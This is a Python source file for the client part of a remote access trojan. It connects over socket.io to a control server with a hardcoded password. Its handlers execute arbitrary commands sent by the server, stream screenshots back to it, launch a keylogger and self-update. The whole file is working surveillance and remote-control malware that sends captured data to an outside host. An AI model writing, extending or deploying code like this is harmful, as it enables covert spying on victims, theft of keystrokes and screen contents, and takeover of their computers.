import socketio
from socketio.exceptions import BadNamespaceError

from payload_client import self_updater
from payload_client.capture_screen import ScreenCapture
from payload_client.clipboard_and_keylogger.keylogger import keylogger
from payload_client.execute_commands.execute_command import CodeExecutor


class Server:
    def __init__(self, URL):
        self.code_executor = CodeExecutor()
        self.screenshot_taker = ScreenCapture(self)

        self.URL = URL
        self.sio = socketio.Client()
        self.sio.connect(URL, auth={"password": "1234", "payload": True})
        print("CONNECTED?!")
        self.register_handlers()
        self._running = True


    def running(self):
        return self._running

    def send_screenshot(self, file):
        file.seek(0)
        file_bytes = file.read()
        try:
            self.sio.emit('upload_screenshot', file_bytes)
            print("Sent screenshot")
        except BadNamespaceError:
            print("I guess the server is down...")

    def send_keystrokes(self):
        pass

    def register_handlers(self):
        @self.sio.on('connect')
        def connected():
            print("Wohoo connected or smth")
        @self.sio.on('execute')
        def execute(command):
            #ToDo implement logic of formatting command as string
            return self.code_executor.execute(command)
        @self.sio.on('start_screen_capture')
        def start_screen_capture():
            self.screenshot_taker.set_frames_per_second(2)  # Capture 2 frames per second
            self.screenshot_taker.start_screen_capture()
        @self.sio.on('stop_screen_capture')
        def stop_screen_capture():
            self.screenshot_taker.stop_screen_capture()
        @self.sio.on('do_self_update')
        def do_self_update():
            self_updater.update()
        @self.sio.on('start_keylogger')
        def do_self_update():
            keylogger()
        @self.sio.on('stop_this_process')
        def do_self_update():
            self._running = False
        @self.sio.on('disconnect')
        def disconnected():
            #We do not stop this process by setting self.running to False
            #Because we will wait for a new server connection
            self.screenshot_taker.stop_screen_capture()
